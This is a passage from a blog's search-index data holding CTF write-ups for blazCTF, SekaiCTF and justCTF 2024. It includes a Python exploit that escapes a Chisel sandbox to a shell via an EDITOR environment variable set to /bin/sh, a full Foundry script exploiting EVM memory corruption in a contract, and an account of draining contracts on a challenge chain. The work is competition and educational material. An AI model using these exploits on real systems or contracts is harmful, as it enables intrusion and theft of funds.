teragas)", "url": "/posts/(ctf)-2024-blazCTF/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2024-09-27 05:02:13 +0900", "snippet": "I played blaz CTF as KimchiPremium, had a lot of fun with the awesome kimchi hackersChisel as a Service Chisel as a ServiceMina just develops a highly robust Solidity sandbox! Connect to Challenge: nc chisel-as-a-service.chal.ctf.so 1337Your Ticket: 2b88a986-595d-45b0-9a24-2aa11a6c5c6d Handouts /* Author: minaminao */ # Solidity,Sandbox / 25 solves / 371 ptsThe server runs chisel with the --no-vm option, and the -e (or -exec) keyword is disabled. The flag’s filename is random, so we need to get a shell.”chisel commandsNo solidity versions installed! Installing solidity version 0.8.19...Welcome to Chisel! Type `!help` to show available commands.⚒️ Chisel help=============General !help | !h - Display all commands !quit | !q - Quit Chisel !exec &amp;lt;command&amp;gt; [args] | !e &amp;lt;command&amp;gt; [args] - Execute a shell command and print the outputSession !clear | !c - Clear current session source !source | !so - Display the source code of the current session !save [id] | !s [id] - Save the current session to cache !load &amp;lt;id&amp;gt; | !l &amp;lt;id&amp;gt; - Load a previous session ID from cache !list | !ls - List all cached sessions !clearcache | !cc - Clear the chisel cache of all stored sessions !export | !ex - Export the current session source to a script file !fetch &amp;lt;addr&amp;gt; &amp;lt;name&amp;gt; | !fe &amp;lt;addr&amp;gt; &amp;lt;name&amp;gt; - Fetch the interface of a verified contract on Etherscan !edit - Open the current session in an editorEnvironment !fork &amp;lt;url&amp;gt; | !f &amp;lt;url&amp;gt; - Fork an RPC for the current session. Supply 0 arguments to return to a local network !traces | !t - Enable / disable traces for the current session !calldata [data] | !cd [data] - Set calldata (`msg.data`) for the current session (appended after function selector). Clears it if no argument provided.Debug !memdump | !md - Dump the raw memory of the current state !stackdump | !sd - Dump the raw stack of the current state !rawstack &amp;lt;var&amp;gt; | !rs &amp;lt;var&amp;gt; - Display the raw value of a variable&#39;s stack allocation. For variables that are &amp;gt; 32 bytes in length, this will display their memory pointer.To execute shell commands, we need to find a command that uses process::Command. Not only the exec command, but also the edit command uses Command to open the editor.ChiselCommand::Edit =&amp;gt; { // create a temp file with the content of the run code let mut temp_file_path = std::env::temp_dir(); temp_file_path.push(&quot;chisel-tmp.sol&quot;); let result = std::fs::File::create(&amp;amp;temp_file_path) .map(|mut file| file.write_all(self.source().run_code.as_bytes())); if let Err(e) = result { return DispatchResult::CommandFailed(format!( &quot;Could not write to a temporary file: {e}&quot; )) } // open the temp file with the editor let editor = std::env::var(&quot;EDITOR&quot;).unwrap_or_else(|_| &quot;vim&quot;.to_string()); let mut cmd = Command::new(editor); cmd.arg(&amp;amp;temp_file_path); match cmd.status() {...In the edit command, it saves the currently running code to /tmp/chisel-tmp.sol and then executes the editor with the file as an argumentWith the setEnv function in the Vm cheat code, we can set the EDITOR environment variable to /bin/sh and execute the running code as a shell script. However, the --no-vm flag is set. What exactly does this flag do?–no-vm flag pub fn to_repl_source(&amp;amp;self) -&amp;gt; String { let Version { major, minor, patch, .. } = self.solc.version; let Self { contract_name, global_code, top_level_code, run_code, config, .. } = self; let (vm_import, vm_constant) = if !config.no_vm { ( &quot;import {Vm} from \\&quot;forge-std/Vm.sol\\&quot;;\\n&quot;, &quot;Vm internal constant vm = Vm(address(uint160(uint256(keccak256(\\&quot;hevm cheat code\\&quot;)))));\\n&quot; ) } else { (&quot;&quot;, &quot;&quot;) };In the chisel code, when the --no-vm flag is set, it doesn’t import the Vm contract or set the vm constant. That’s all. We can still call the cheat codes in the Vm contract using the address address(uint160(uint256(keccak256(&quot;hevm cheat code&quot;)))).By setting the EDITOR environment variable to /bin/sh, we can execute the contents of the running code as a shell script. However, the running code needs to be valid Solidity. To work around this, we can simply add a comment with ; and run cat flag, like //; cat /flag-*.exploitimport requestsurl = &quot;http://snwo.kr:3000/&quot;code = &quot;&quot;&quot;//;cat /flag-*address hevm = address(uint160(uint256(keccak256(&quot;hevm cheat code&quot;))));interface VM { function setEnv(string calldata key, string calldata value) external; }VM vm = VM(hevm);vm.setEnv(&quot;EDITOR&quot;, &quot;/bin/sh&quot;);!edit&quot;&quot;&quot;uuid = requests.get(url+&quot;run&quot;,params={&quot;code&quot;:code}).json()[&#39;uuid&#39;]r = requests.get(url+&quot;out/&quot;+uuid)print(r.text)Teragas TeragasAfter getting exploited by REVMC bug, Tony started to hate Paradigm. Seeing Paradigm invested in so many parallel EVM chains and built Reth, Tony decided to build an even faster chain to compete with them. This is a King Of the Hill challenge. The more ETHs you steal, the more points you would get. Submit your exploit at teragas.ctf.so … /* Author: shoucccc */ # KoH,EVM / 6 solves / 2500 pts Team KimchiPremium: 1986007ETHTeam DPRK Workers In Your Company: 1796703ETHTeam Wut is Ciallo: 1656267ETHTeam Amber Labs: 1532119ETHTeam offside_labs_interns: 1478952ETHTeam DeFiHackLabs: 277542ETHTeam shou: 0ETHJust a brief writeup. we earned a total of 19,986,007 ETH. There was a bug that each state-related opcodes do not recover the state when it reverts. So we can leverage this to bypass check balance or smth. function join(address usr, uint wad) external note { vat.move(address(this), usr, mul(ONE, wad)); dai.burn(msg.sender, wad); } function exit(address usr, uint wad) external note { require(live == 1, &quot;DaiJoin/not-live&quot;); vat.move(msg.sender, address(this), mul(ONE, wad)); dai.mint(usr, wad); }For example, in the MakerDAO contract, tokens are minted first and then the balance is checked. Since the sstore opcode doesn’t revert the state when the transaction reverts, we were able to keep the minted tokens.We drained all WETH pairs of top TVL swaps, as well as flash loan contracts, bridges, and smth… It was a lot of fun exploring the Ethereum chain to drain the contracts 🫠" }, { "title": "(CTF) SekaiCTF 2024 writeup (ZOO)", "url": "/posts/(ctf)-2024-SekaiCTF/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2024-08-27 05:02:13 +0900", "snippet": "I made solidity assembly challenge in sekai ctf 2024. ended up with 13 solves. you can check the detail hereZOO welcome to assembly zooThere are two functions, fallback and commit (internal)fallback() external payable { function(bytes memory)[] memory functions = new function( bytes memory )[](1); functions[0] = commit; bytes memory local_animals; assembly { let arr := mload(0x40) let size := calldatasize() mstore(arr, size) let size_align := add(add(size, sub(0x20, mod(size, 0x20))), 0x20) mstore(0x40, add(arr, size_align)) calldatacopy(add(arr, 0x20), 0, size) local_animals := mload(0x40) mstore(0x40, add(local_animals, 0x120))in fallback function, first it creates function pointer array with length 1. And then, it copies the calldata to arr, with the calldatasize aligned to 0x20 and allocates local_animals with size 0x120. If we sent 0x200 size of calldata, the memory layout is as follows offset value comment 0x80 0x01 length of functions 0xa0 0x31b offset of commit function 0xc0 0xXX calldatasize 0xe0 0xXX calldata …     0x300 0x00 local_animals count 0x320 0xXX offset of first local_animal 0x400 0xXX offset of last local_animal It provides 3 types of opcode add_animal (0x10) edit_animal (0x20) del_animal (0x30)The format of the calldata is as follows. (The number in parentheses indicates the size)   A B C D E 1 ADD(1) IDX(1) NAME_LENGTH(2) TYPE(2) NAME(NAME_LENGTH) 2 EDIT(1) IDX(1) EDIT_TYPE(1) NAME_LENGTH(2) NAME(NAME_LENGTH) 3 EDIT(1) IDX(1) EDIT_TYPE(1) NEW_TYPE(2)   4 DEL(1) IDX(1)       fallback - analysiscase 0x10 { let idx := mload(add(add(arr, 0x20), i)) idx := shr(0xf8, idx) i := add(i, 1) if gt(idx, 7) { revert(0, 0) } let name_length := mload(add(add(arr, 0x20), i)) name_length := shr(0xf0, name_length) i := add(i, 2) let animal_index := mload(add(add(arr, 0x20), i)) animal_index := shr(0xf0, animal_index) i := add(i, 2) let temp := mload(0x40) mstore(temp, animal_index) mcopy(add(temp, 0x40), add(add(arr, 0x20), i), name_length) i := add(i, name_length) name_length := add( name_length, sub(0x20, mod(name_length, 0x20)) ) mstore(add(temp, 0x20), name_length) mstore(0x40, add(temp, add(name_length, 0x40))) mstore(add(add(local_animals, 0x20), mul(0x20, idx)), temp) let animals_count := mload(local_animals) mstore(local_animals, add(animals_count, 1))}First, in add_animal, It checks whether the index is greater than 7. Then, it allocates memory based on name_length and adds it’s offset to local_animals and then increase animals count. there’s no check to prevent allocating in the same slot multiple times, which could cause the animals count to exceed 7.The structure of animal is as follows offset value comment 0x00 0xXX animal_index 0x20 0xXX animal_length (aligned to 0x20) 0x40 0xXX animal_name …     case 0x20 { let idx := mload(add(add(arr, 0x20), i)) idx := shr(0xf8, idx) i := add(i, 1) if gt(idx, 7) { revert(0, 0) } let offset := add(add(local_animals, 0x20), mul(0x20, idx)) let temp := mload(offset) let edit_type := mload(add(add(arr, 0x20), i)) edit_type := shr(0xf8, edit_type) i := add(i, 1) switch edit_type case 0x21 { let name_length := mload(add(add(arr, 0x20), i)) name_length := shr(0xf0, name_length) i := add(i, 2) mcopy( add(temp, 0x40), add(add(arr, 0x20), i), name_length ) } case 0x22 { let new_type := mload(add(add(arr, 0x20), i)) new_type := shr(0xf0, new_type) i := add(i, 2) mstore(add(temp, 0x20), new_type) }}Second, in edit_animal, It also checks whether the index is greater than 7. Then, It gets the type of edit. edit name (0x21): edit the name of animal with new length.This causes an overflow, allowing us to modify the contents of next-allocated animal edit type (0x22): edit type of animal with 2-byte type there’s no check about offset 0, so we can modify 0x40~0x40+name_lengthcase 0x30 { let idx := mload(add(add(arr, 0x20), i)) idx := shr(0xf8, idx) i := add(i, 1) if gt(idx, 7) { revert(0, 0) } let offset := add(add(local_animals, 0x20), mul(0x20, idx)) let temp := mload(offset) let copy_size := sub(0x100, mul(0x20, idx)) mcopy(offset, add(offset, 0x20), copy_size) let animals_count := mload(local_animals) animals_count := sub(animals_count, 1) mstore(local_animals, animals_count)}Third, in del_animal, It also checks whether the index is greater than 7. Then, It moves forward by 0x20 bytes starting from index i. here’s a wrong calculation, sub(0x100, mul(0x20, idx)) so we can set the last element of local_animal 2-byte type of first animal. So we can get arbitrary memory write with this primitive. offset value comment 0x320 0xXX offset of first local_animal 0x400 0xXX offset of last local_animal 0x420 0xXX type of first aniamal 0x440 0xXX name_length of first animal 0x460 0x00 name of first animal …     commit - analysis Name Type Slot Offset Bytes Contract _paused bool 0 0 1 src/ZOO.sol:ZOO isSolved uint256 1 0 32 src/ZOO.sol:ZOO animals struct ZOO.AnimalWrapper[] 2 0 32 src/ZOO.sol:ZOO             This is storage layout about ZOO contract.AnimalWrapper[] public animals;struct AnimalWrapper { Animal animal; uint256 counter; }...constructor() { animals.push(AnimalWrapper(new Animal(&quot;PANDA&quot;, &quot;PND&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;TIGER&quot;, &quot;TGR&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;HORSE&quot;, &quot;HRS&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;ZIBRA&quot;, &quot;ZBR&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;HIPPO&quot;, &quot;HPO&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;LION&quot;, &quot;LON&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;BEAR&quot;, &quot;BAR&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;WOLF&quot;, &quot;WLF&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;ELEPHANT&quot;, &quot;ELP&quot;), 0)); animals.push(AnimalWrapper(new Animal(&quot;RHINO&quot;, &quot;RNO&quot;), 0)); // The ZOO is not opened yet :( _pause();}In constructor, it pushes some Animal token and sets the ZOO contract to pause. animals is AnimalWrapper struct array which has counter.pragma solidity 0.8.25;import {ERC721} from &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;import {Ownable} from &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract Animal is ERC721, Ownable { struct status { uint256 feed; string name; } mapping(uint256 =&amp;gt; status) public animalStatus; uint256 public counter; constructor(string memory name, string memory symbol) ERC721(name, symbol) Ownable(msg.sender) { } function feed(uint256 tokenId, uint256 amount) public onlyOwner { animalStatus[tokenId].feed += amount; } function setName(uint256 tokenId, string memory name) public onlyOwner { animalStatus[tokenId].name = name; } function addAnimal(address to) public onlyOwner { _safeMint(to, counter); counter++; }}Animal Contract is just ERC721 contract which only can called by owner. but it’s unreleated to the solution :3function commit(bytes memory data) internal whenNotPaused { assembly { let counter := 0 let length := mload(data) for { let i := 0 } lt(i, length) { i := add(i, 1) } { let idx let name let memPtr := mload(0x40) let ptr := mload(add(add(data, 0x20), counter)) idx := mload(ptr) name := add(ptr, 0x20) let name_length := mload(name) counter := add(counter, 0x20) mstore(0x00, animals.slot) let slot_hash := keccak256(0x00, 0x20) let animal_addr := sload(add(slot_hash, mul(2, idx))) let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1)) if gt(animal_counter, 50) { revert(0, 0) } mstore(memPtr, shl(0xe0, 0x1436163e)) mstore(add(memPtr, 0x4), caller()) pop(call(gas(), animal_addr, 0x00, memPtr, 0x24, memPtr, 0x00)) mstore(memPtr, shl(0xe0, 0x61bc221a)) pop(staticcall(gas(), animal_addr, memPtr, 0x20, memPtr, 0x20)) let animal_count := sub(mload(memPtr), 0x1) mstore(memPtr, shl(0xe0, 0xfe55932a)) mstore(add(memPtr, 0x4), animal_count) mstore(add(memPtr, 0x24), 0x40) mstore(add(memPtr, 0x44), name_length) mcopy(add(memPtr, 0x64), name, name_length) pop(call(gas(), animal_addr, 0x00, memPtr, 0x84, memPtr, 0x00)) sstore( add(add(slot_hash, mul(2, idx)), 1), add(animal_counter, 1) ) } }}In commit function, It gets each animal name, index and mint animal to msg.sender and increase each counter.animal_counter = keccak256(animals.slot)+2*idx+1animal_counter is calculated as above. It uses add to calculate so we can overflow it to return slot number 1 (slot number of isSolved)➜ (uint256(int256(-1)) - uint256(keccak256(abi.encode(2))))/2+1Type: uint256├ Hex: 0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299├ Hex (full word): 0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299└ Decimal: 43344706377821576760468996987613231211325356002982170351334206299952371618457yeah, so we can pass that number as idx to increase isSolved by 1. but size of the idx is only 2-byte we should bypass pause to enter commit functionpause - bypassyou check the bytecode at bytegraph.xyz. It pushes 0x323 and checks whether slot 0 (pause) is zero, if not it reverts.In EVM, we can only jump to JUMPDEST or it reverts. So, to bypass pause check, we should jump to 0x323.Plan for Attackthere are various ways to manipulate memory :3 Set local_animals to point to the offset with the target index (as mentioned above). Set the offset of commit to 0x323 to bypass the pause check.I used the bug of in del add a fake_animal with the target index in the name, and set its index to 0x400 (the offset of the first animal). delete first index to set the 7th offset to 0x400 (offset of first animal) edit 7th type (first animal) to 0x80 (function table offset) delete first index to set the 7th offset to 0x80 (offset of function table) edit 7th type (offset of function_table) to 0x323 (over the pause check logic) edit 6th type (0x400) to 0x300 (offset of local_animal) delete first index to set the 7th offset to local_animal edit 7th type (first offset of local_animal) to 0x460 (offset of fake_animal) only one animal was added, but it was deleted three times, causing the animal_count to become a negative number. Now, add three animals to index 1. add length padding to ensure the locate local_animal is located at 0x300Solve.s.sol &amp;amp; solve.shpragma solidity ^0.8.25;import {Script, console2} from &quot;forge-std/Script.sol&quot;;interface Setup { function zoo() external view returns (address); function isSolved() external view returns (bool);}contract Solve is Script { function run() public { vm.startBroadcast(); Setup setup = Setup(vm.envAddress(&quot;SETUP&quot;)); console2.log(&quot;setup&quot;, address(setup)); address zoo = setup.zoo(); console2.log(&quot;zoo&quot;, address(zoo)); // ADD(1) | IDX(1) | NAME_LENGTH(2) | TYPE(2) | NAME(NAME_LENGTH) // EDIT(1) | IDX(1) | EDIT_TYPE(1) | NAME_LENGTH(2) | NAME(NAME_LENGTH) // EDIT{1) | IDX(1) | EDIT_TYPE(1) | NEW_TYPE(2) // DEL(1) | IDX(1) // function pointer: 0x80 ( 0x312 ) // local animal : 0x300 // first animal: 0x320 // first alloc : 0x420 // fake_animal : 0x460 // 0x323 : over pause uint256 target_idx = uint256(int256(-1)) - uint256(keccak256(abi.encode(2))); uint16 target_jmp = 0x323; uint16 function_table = 0x80; uint16 first_alloc = 0x400; uint16 local_animal = 0x300; uint16 fake_animal_idx = 0x460; target_idx /= 2; target_idx += 1; bytes memory call = &quot;&quot;; bytes memory fake_animal = abi.encodePacked(uint256(target_idx), uint256(0x20), hex&quot;41414141&quot;); call = abi.encodePacked(call, uint8(0x10),uint8(0x00),uint16(fake_animal.length),uint16(first_alloc), fake_animal); call = abi.encodePacked(call, hex&quot;3000&quot;); call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(function_table)); call = abi.encodePacked(call, hex&quot;3000&quot;); call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(target_jmp)); call = abi.encodePacked(call, uint8(0x20),uint8(0x06),uint8(0x22), uint16(local_animal)); call = abi.encodePacked(call, hex&quot;3000&quot;); call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(fake_animal_idx)); call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex&quot;41414141&quot;); call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex&quot;41414141&quot;); call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex&quot;41414141&quot;); uint256 length = call.length; console2.log(&quot;length&quot;, length); uint256 target = 0x200 - length; for (uint i = 0; i &amp;lt; target; i++) { call = abi.encodePacked(call, hex&quot;ba&quot;); } (bool success, bytes memory out) = address(zoo).call(call); console2.log(&quot;solved?&quot;, setup.isSolved()); assert(setup.isSolved()); vm.stopBroadcast(); }}export RPC=&amp;lt;rpc&amp;gt;export PVKEY=&amp;lt;pvKey&amp;gt;export SETUP=&amp;lt;setup-address&amp;gt;forge init --force .forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Solve.s.sol:Solve --evm-version cancun flag: SEKAI{super-duper-memory-master-:3}pro tip - debugusing foundry debugger, you can easily debug the contract :3pragma solidity ^0.8.24;import {Test, console2} from &quot;forge-std/Test.sol&quot;;import {ZOO} from &quot;src/ZOO.sol&quot;;import {IERC721Receiver} from &quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;;contract ZOOTest is Test { function test_run() public { ZOO zoo = new ZOO(); // ADD(1) | IDX(1) | NAME_LENGTH(2) | TYPE(2) | NAME(NAME_LENGTH) // EDIT(1) | IDX(1) | EDIT_TYPE(1) | NAME_LENGTH(2) | NAME(NAME_LENGTH) // EDIT{1) | IDX(1) | EDIT_TYPE(1) | NEW_TYPE(2) // DEL(1) | IDX(1) // function pointer: 0x80 ( 0x312 ) // local animal : 0x300 // first animal: 0x320 // first alloc : 0x420 // fake_animal : 0x460 // 0x323 : over pause uint256 target_idx = uint256(int256(-1)) - uint256(keccak256(abi.encode(2))); uint16 target_jmp = 0x323; uint16 function_table = 0x80; uint16 first_alloc = 0x400; uint16 local_animal = 0x300; uint16 fake_animal_idx = 0x460; target_idx /= 2; target_idx += 1; bytes memory call = &quot;&quot;; bytes memory fake_animal = abi.encodePacked(uint256(target_idx), uint256(0x20), hex&quot;41414141&quot;); call = abi.encodePacked(call, uint8(0x10),uint8(0x00),uint16(fake_animal.length),uint16(first_alloc), fake_animal); call = abi.encodePacked(call, hex&quot;3000&quot;); call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(function_table)); call = abi.encodePacked(call, hex&quot;3000&quot;); call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(target_jmp)); call = abi.encodePacked(call, uint8(0x20),uint8(0x06),uint8(0x22), uint16(local_animal)); call = abi.encodePacked(call, hex&quot;3000&quot;); call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(fake_animal_idx)); call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex&quot;41414141&quot;); call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex&quot;41414141&quot;); call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex&quot;41414141&quot;); // Add length padding to ensure the correct offset uint256 length = call.length; console2.log(&quot;length&quot;, length); uint256 target = 0x200 - length; for (uint i = 0; i &amp;lt; target; i++) { call = abi.encodePacked(call, hex&quot;ba&quot;); } (bool success, bytes memory out) = address(zoo).call(call); console2.log(&quot;success&quot;, success); console2.log(&quot;length: &quot;, out.length); console2.logBytes(out); console2.log(&quot;solved?&quot;, zoo.isSolved()); }}just write this code to test/ZOO.t.sol and run this command forge debug test/ZOO.t.sol:ZOOTest -s “test_run()”\\o3o/ConclusionThank you for enjoy my chall and SekaiCTF 2024! I’ll return to SekaiCTF 2025 with even more harder non-EVM challenge :3" }, { "title": "(CTF) justCTF 2024 writeup (Blockchains)", "url": "/posts/(ctf)-2024-justCTF/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2024-06-16 17:02:13 +0900", "snippet": "It was first time for me to solve move based challenge. Solved 3 blockchain challenges, World of Ottercraft, The Otter Scrolls, Dark BrOTTERhood ( all move based challenge )The Otter ScrollsAll the challenges use the Sui CTF Framework. Like solana challenges, we should send out compiled contract to the server.framework/src/main.rs // Publish Challenge Module let chall_dependencies: Vec&amp;lt;String&amp;gt; = Vec::new(); let chall_addr = sui_ctf_framework::publish_compiled_module( &amp;amp;mut adapter, mncp_modules, chall_dependencies, Some(String::from(&quot;challenger&quot;)), ).await; deployed_modules.push(chall_addr); println!(&quot;[SERVER] Module published at: {:?}&quot;, chall_addr); let mut solution_data = [0 as u8; 2000]; let _solution_size = stream.read(&amp;amp;mut solution_data)?; // Send Challenge Address let mut output = String::new(); fmt::write( &amp;amp;mut output, format_args!( &quot;[SERVER] Challenge modules published at: {}&quot;, chall_addr.to_string().as_str(), ), ) .unwrap(); stream.write(output.as_bytes()).unwrap();... // Publish Solution Module let mut sol_dependencies: Vec&amp;lt;String&amp;gt; = Vec::new(); sol_dependencies.push(String::from(&quot;challenge&quot;)); let mut mncp_solution : Vec&amp;lt;MaybeNamedCompiledModule&amp;gt; = Vec::new(); let module: CompiledModule = match CompiledModule::deserialize_with_defaults(&amp;amp;solution_data.to_vec()) { Ok(data) =&amp;gt; data, Err(e) =&amp;gt; { let _ = adapter.cleanup_resources().await; return Err(Box::new(e)) } }; ... let sol_addr = sui_ctf_framework::publish_compiled_module( &amp;amp;mut adapter, mncp_solution, sol_dependencies, Some(String::from(&quot;solver&quot;)), ).await; println!(&quot;[SERVER] Solution published at: {:?}&quot;, sol_addr);In main.rs, It publishes challenge module and read bytecode, then publishes out solver module.framework/src/main.rs // Prepare Function Call Arguments let mut args_solve: Vec&amp;lt;SuiValue&amp;gt; = Vec::new(); let spellbook = SuiValue::Object(FakeID::Enumerated(2, 0), None); args_solve.push(spellbook.clone()); let type_args_solve: Vec&amp;lt;TypeTag&amp;gt; = Vec::new(); // Call solve Function let ret_val = match sui_ctf_framework::call_function( &amp;amp;mut adapter, sol_addr, &quot;solve&quot;, &quot;solve&quot;, args_solve, type_args_solve, Some(&quot;solver&quot;.to_string()), ).await { Ok(output) =&amp;gt; output, Err(e) =&amp;gt; { let _ = adapter.cleanup_resources().await; println!(&quot;[SERVER] error: {e}&quot;); return Err(&quot;error during call to solve::solve&quot;.into()) } }; // Check Solution let mut args_check: Vec&amp;lt;SuiValue&amp;gt; = Vec::new(); args_check.push(spellbook.clone()); let type_args_check: Vec&amp;lt;TypeTag&amp;gt; = Vec::new(); let sol_ret = sui_ctf_framework::call_function( &amp;amp;mut adapter, chall_addr, &quot;theotterscrolls&quot;, &quot;check_if_spell_casted&quot;, args_check, type_args_check, Some(&quot;solver&quot;.to_string()), ).await; println!(&quot;[SERVER] Return value {:#?}&quot;, sol_ret); println!(&quot;&quot;); // Validate Solution match sol_ret { Ok(_) =&amp;gt; { println!(&quot;[SERVER] Correct Solution!&quot;); println!(&quot;&quot;); if let Ok(flag) = env::var(&quot;FLAG&quot;) { let message = format!(&quot;[SERVER] Congrats, flag: {}&quot;, flag);And, the server calls the solve function with the spellbook object and calls check_if_spell_casted function to check if it was solved.framework/chall/sources/the_otter_scrolls.move fun init(ctx: &amp;amp;mut TxContext) { let mut all_words = table::new(ctx); let fire = vector[ string::utf8(b&quot;Blast&quot;), string::utf8(b&quot;Inferno&quot;), string::utf8(b&quot;Pyre&quot;), string::utf8(b&quot;Fenix&quot;), string::utf8(b&quot;Ember&quot;) ]; let wind = vector[ string::utf8(b&quot;Zephyr&quot;), string::utf8(b&quot;Swirl&quot;), string::utf8(b&quot;Breeze&quot;), string::utf8(b&quot;Gust&quot;), string::utf8(b&quot;Sigil&quot;) ]; let water = vector[ string::utf8(b&quot;Aquarius&quot;), string::utf8(b&quot;Mistwalker&quot;), string::utf8(b&quot;Waves&quot;), string::utf8(b&quot;Call&quot;), string::utf8(b&quot;Storm&quot;) ]; let earth = vector[ string::utf8(b&quot;Tremor&quot;), string::utf8(b&quot;Stoneheart&quot;), string::utf8(b&quot;Grip&quot;), string::utf8(b&quot;Granite&quot;), string::utf8(b&quot;Mudslide&quot;) ]; let power = vector[ string::utf8(b&quot;Alakazam&quot;), string::utf8(b&quot;Hocus&quot;), string::utf8(b&quot;Pocus&quot;), string::utf8(b&quot;Wazzup&quot;), string::utf8(b&quot;Wrath&quot;) ]; table::add(&amp;amp;mut all_words, 0, fire); table::add(&amp;amp;mut all_words, 1, wind); table::add(&amp;amp;mut all_words, 2, water); table::add(&amp;amp;mut all_words, 3, earth); table::add(&amp;amp;mut all_words, 4, power); let spellbook = Spellbook { id: object::new(ctx), casted: false, spells: all_words }; transfer::share_object(spellbook); }In init function (same as constructor in solidity), it makes a spellbook vector and uses it as an argument of transfer::share_object. Then we can use this object to access spellbook.framework/chall/sources/the_otter_scrolls.move public fun cast_spell(spell_sequence: vector&amp;lt;u64&amp;gt;, book: &amp;amp;mut Spellbook) { let fire = table::remove(&amp;amp;mut book.spells, 0); let wind = table::remove(&amp;amp;mut book.spells, 1); let water = table::remove(&amp;amp;mut book.spells, 2); let earth = table::remove(&amp;amp;mut book.spells, 3); let power = table::remove(&amp;amp;mut book.spells, 4); let fire_word_id = *vector::borrow(&amp;amp;spell_sequence, 0); let wind_word_id = *vector::borrow(&amp;amp;spell_sequence, 1); let water_word_id = *vector::borrow(&amp;amp;spell_sequence, 2); let earth_word_id = *vector::borrow(&amp;amp;spell_sequence, 3); let power_word_id = *vector::borrow(&amp;amp;spell_sequence, 4); let fire_word = vector::borrow(&amp;amp;fire, fire_word_id); let wind_word = vector::borrow(&amp;amp;wind, wind_word_id); let water_word = vector::borrow(&amp;amp;water, water_word_id); let earth_word = vector::borrow(&amp;amp;earth, earth_word_id); let power_word = vector::borrow(&amp;amp;power, power_word_id); if (fire_word == string::utf8(b&quot;Inferno&quot;)) { if (wind_word == string::utf8(b&quot;Zephyr&quot;)) { if (water_word == string::utf8(b&quot;Call&quot;)) { if (earth_word == string::utf8(b&quot;Granite&quot;)) { if (power_word == string::utf8(b&quot;Wazzup&quot;)) { book.casted = true; } } } } } } public fun check_if_spell_casted(book: &amp;amp;Spellbook): bool { let casted = book.casted; assert!(casted == true, 1337); casted }In cast_spell function, It gets each index of the spellbook and checks it against some words. If all indexes are correct, set book.casted=true. The correct indexes are 1 (Inferno), 0 (Zephyr), 3 (Call), 3 (Granite), 3 (Wazzup).framework-solve/solve/sources/solve.movemodule solve::solve { // [*] Import dependencies use challenge::theotterscrolls; use sui::tx_context::{Self, TxContext}; public fun solve( _spellbook: &amp;amp;mut theotterscrolls::Spellbook, _ctx: &amp;amp;mut TxContext ) { let spell_sequence = vector[ 1, // Inferno 0, // Zephyr 3, // Call 3, // Granite 3 // Wazzup ]; theotterscrolls::cast_spell(spell_sequence, _spellbook); theotterscrolls::check_if_spell_casted(_spellbook); }}solve code, create index vector and call cast_spell funciton in theotterscrolls module. then, we need to change some code to get flag. host, port in framework-solve/src/main.rs fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let host = env::var(&quot;HOST&quot;).unwrap_or_else(|_| &quot;tos.nc.jctf.pro&quot;.to_string()); // replace with remote ip let port = env::var(&quot;PORT&quot;).unwrap_or_else(|_| &quot;31337&quot;.to_string()); challenge address in framework-solve/dependency/Move.toml ...[addresses]admin = &quot;0xfccc9a421bbb13c1a66a1aa98f0ad75029ede94857779c6915b44f94068b921e&quot;challenge = &quot;&amp;lt;&amp;gt;&quot; we can check the challenge address by simply connecting to server. It’s fixed and won’t be changed.Next, we need to compile the module with sui build and run the rust code. it’s all in sources/run_client.sh. just run this script (we need to install sui). we can check a flag in Connection Output➜ sources ./run_client.sh + cd framework-solve/solve+ sui move build...+ cd ..+ cargo r --release Finished release [optimized] target(s) in 0.00s Running `target/release/solve-framework` - Connected! - Loaded solution! - Sent solution! - Connection Output: &#39;[SERVER] Challenge modules published at: 542fe29e11d10314d3330e060c64f8fb9cd341981279432b03b2bd51cf5d489b[SERVER] Solution published at b4c0f35aeb28b4e0aa758f063059f3583d47686b0a057089f46bee4f474f871a&#39; - Connection Output: &#39;[SERVER] Congrats, flag: justCTF{Th4t_sp3ll_looks_d4ngerous...keep_y0ur_distance}&#39; - Connection Output: &#39;&#39; - Terminated. justCTF{Th4t_sp3ll_looks_d4ngerous…keep_y0ur_distance}Dark BrOTTERhoodgoaldark_brotterhood.move public fun buy_flag(vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, player: &amp;amp;mut Player, ctx: &amp;amp;mut TxContext): Flag { assert!(coin::value(&amp;amp;player.coins) &amp;gt;= 1337, WRONG_AMOUNT); // init * 10 let coins = coin::split(&amp;amp;mut player.coins, 1337, ctx); coin::join(&amp;amp;mut vault.cash, coins); Flag { id: object::new(ctx), user: tx_context::sender(ctx), flag: true } }... public fun prove(board: 